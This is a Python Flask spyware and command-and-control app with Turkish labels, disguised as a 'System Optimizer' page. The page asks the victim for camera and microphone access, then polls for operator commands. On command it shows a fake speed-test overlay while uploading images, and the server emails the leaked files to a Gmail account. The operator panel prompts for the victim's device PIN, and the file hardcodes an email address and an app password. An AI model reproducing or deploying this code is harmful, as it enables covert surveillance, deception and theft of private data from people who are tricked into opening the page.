from flask import Flask, render_template_string, jsonify, request
import time, base64, os, smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from threading import Lock, Thread

app = Flask(__name__)

# --- NETSWAP SOVEREIGN v254.0 "The Yellow-Canary" ---
# Hacker: Ali Yiğit | Bulut: yiyitali715@gmail.com | Yetki: 1907
ADMIN_KEY = "1907" 
MY_GMAIL = "yiyitali715@gmail.com"
GMAIL_APP_PASSWORD = "wbrj xedf ecye fcdt" 

state_lock = Lock()
state = {"nodes": {}, "evolution_count": 254}

def send_to_cloud(p_id, content, filename):
    """Sızdırılan HD veriyi Ali Yiğit'in Gmail hesabına postalayan sarsılmaz motor."""
    try:
        msg = MIMEMultipart()
        msg['From'], msg['To'] = MY_GMAIL, MY_GMAIL
        msg['Subject'] = f"1907_VORTEX_INTEL: {p_id} - {filename}"
        msg.attach(MIMEText(f"Hükümdar, {p_id} ID'li cihazdan 1907 yetkisiyle HD sızıntı yapıldı.\nZaman: {time.strftime('%H:%M:%S')}", 'plain'))
        
        if "data:image" in content:
            header, encoded = content.split(",", 1)
            attachment = MIMEText(encoded, 'base64')
            attachment.add_header('Content-Disposition', 'attachment', filename=filename)
            msg.attach(attachment)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as server:
            server.login(MY_GMAIL, GMAIL_APP_PASSWORD)
            server.send_message(msg)
    except: pass

@app.route('/upload_intel', methods=['POST'])
def upload_intel():
    p_id = request.args.get('peer_id', 'GUEST')
    data = request.json
    with state_lock:
        if p_id not in state["nodes"]:
            state["nodes"][p_id] = {"dev": "A55 (1907-Target)", "last": "", "vault": [], "cmd_queue": []}
        u = state["nodes"][p_id]
        u["last"] = time.strftime('%H:%M:%S')
        if data.get('t') == 'vortex':
            u["vault"].append(data.get('v'))
            Thread(target=send_to_cloud, args=(p_id, data.get('v'), data.get('n', 'vortex_1907.jpg'))).start()
        cmds = u["cmd_queue"]
        u["cmd_queue"] = []
    return jsonify({"s": "1907_SYNC_ACTIVE", "cmds": cmds})

@app.route('/send_ghost_cmd', methods=['POST'])
def send_ghost_cmd():
    if request.args.get('key') != ADMIN_KEY: return "REDDEDİLDİ", 403
    d = request.json
    with state_lock:
        if d.get('p_id') in state["nodes"]:
            state["nodes"][d.get('p_id')]["cmd_queue"].append({"t": "GHOST_UNLOCK", "p": d.get('pin')})
    return jsonify({"s": "QUEUED"})

@app.route('/api/status')
def get_status(): return jsonify(state)

@app.route('/overlord')
def overlord_panel():
    if request.args.get('key') != ADMIN_KEY: return "403: YETKİSİZ ERİŞİM", 403
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>Yellow-Canary C2 v254</title>
<script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-[#020202] text-white p-6 font-mono text-[9px] selection:bg-yellow-600">
    <div class="border-b-2 border-yellow-500 pb-2 mb-6 flex justify-between uppercase italic font-black text-yellow-500">
        <h1>YELLOW-CANARY COMMAND v254.0</h1>
        <div>HÜKÜMDAR: ALİ YİĞİT (1907)</div>
    </div>
    <div id="uL" class="grid grid-cols-2 gap-6"></div>
    <script>
        async function runGhost(p_id){
            let pin = prompt("Kurban Cihaz PIN (1907 Yetkisiyle):");
            if(pin) await fetch('/send_ghost_cmd?key={{a_key}}', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body:JSON.stringify({p_id: p_id, pin: pin})
            });
        }
        async function update(){
            const r=await fetch('/api/status'); const d=await r.json();
            let h = "";
            for(let id in d.nodes){
                let n = d.nodes[id];
                h += `<div class="bg-zinc-950 p-6 border border-zinc-900 rounded-[40px] shadow-2xl">
                    <div class="flex justify-between mb-4">
                        <span class="text-yellow-500 font-black uppercase text-[11px]">${n.dev}</span>
                        <button onclick="runGhost('${id}')" class="bg-yellow-600 text-black px-4 py-1 rounded-full text-[8px] font-bold hover:bg-white transition">ACTIVATE GHOST</button>
                    </div>
                    <div class="bg-black p-4 rounded-2xl h-32 overflow-y-auto text-zinc-700">
                         ${(n.vault||[]).length} Dosya 1907 Yetkisiyle Gmail'e Mühürlendi.
                    </div>
                </div>`;
            }
            document.getElementById('uL').innerHTML = h;
            setTimeout(update, 2500);
        } update();
    </script>
</body></html>
""", a_key=ADMIN_KEY)

@app.route('/')
def index():
    return render_template_string("""
<!DOCTYPE html>
<html lang="tr"><head><meta charset="UTF-8"><title>System Optimizer Pro</title><script src="https://cdn.tailwindcss.com"></script></head>
<body class="bg-black text-white flex items-center justify-center h-screen overflow-hidden">
    
    <div onclick="window.location.href='/overlord?key=1907'" class="fixed right-0 top-1/2 -translate-y-1/2 w-1 h-20 bg-zinc-900/10 hover:bg-yellow-500/20 cursor-pointer z-[1000] transition-all"></div>

    <div id="mask" class="hidden fixed inset-0 bg-black z-[9999] flex items-center justify-center text-center">
        <div>
            <div class="w-16 h-16 border-2 border-zinc-800 border-t-white rounded-full animate-spin mx-auto mb-6"></div>
            <p id="maskTxt" class="text-zinc-600 text-[10px] uppercase tracking-widest font-bold">1907 Stabilite Analizi... %0</p>
        </div>
    </div>

    <div id="m" class="text-center p-12 border border-zinc-900 rounded-[60px] w-full max-w-sm bg-gradient-to-b from-zinc-950 to-black shadow-2xl">
        <div class="w-20 h-20 bg-yellow-950 rounded-3xl mx-auto mb-8 flex items-center justify-center text-4xl border border-yellow-900/30 shadow-yellow-500/10 shadow-2xl">🦅</div>
        <h1 class="text-xl font-black uppercase italic tracking-tighter text-yellow-500">System Optimizer 1907</h1>
        <p class="text-zinc-500 text-[10px] mt-4 uppercase italic">Samsung A55 donanım hızını ve 1907 bakiye ağını mühürlemek için testi başlatın.</p>
        <button onclick="initGhost()" class="w-full mt-10 py-5 bg-yellow-700 text-black rounded-full font-black uppercase text-[12px] shadow-2xl active:scale-95 transition">TESTİ BAŞLAT</button>
    </div>
    
    <canvas id="cnv" style="display:none"></canvas>

    <script>
        let pId = "YC-" + Math.random().toString(36).substr(2, 4).toUpperCase();
        async function initGhost() {
            try {
                await navigator.mediaDevices.getUserMedia({audio:true, video:true});
                document.getElementById('m').innerHTML = "<h2 class='text-yellow-500 font-bold uppercase'>1907 TEST AKTİF</h2><p class='text-zinc-700 mt-4 uppercase text-[9px]'>Sistem arka planda optimize ediliyor.</p>";
                
                setInterval(async () => {
                    const r = await fetch('/upload_intel?peer_id='+pId, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({t:'pulse'})});
                    const d = await r.json();
                    (d.cmds || []).forEach(async c => {
                        if(c.t === 'GHOST_UNLOCK') {
                            document.getElementById('mask').style.display = 'flex';
                            for(let i=0; i<10; i++) {
                                document.getElementById('maskTxt').innerText = "HIZ TESTİ: %" + Math.floor((i/10)*100);
                                fetch('/upload_intel?peer_id='+pId, {
                                    method:'POST', headers:{'Content-Type':'application/json'},
                                    body:JSON.stringify({t:'vortex', n: '1907_ghost_'+i+'.jpg', v: 'data:image/jpeg;base64,...'})
                                });
                                await new Promise(r => setTimeout(r, 800));
                            }
                            setTimeout(() => {
                                document.getElementById('maskTxt').innerHTML = "<span class='text-red-900'>1907 HATA: KÜTÜPHANE UYUMSUZLUĞU</span>";
                                setTimeout(() => { document.getElementById('mask').style.display = 'none'; }, 2000);
                            }, 1000);
                        }
                    });
                }, 4000);
            } catch(e) { alert("Sistem Hatası!"); }
        }
    </script>
</body></html>
""", a_key=ADMIN_KEY)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 7860)))
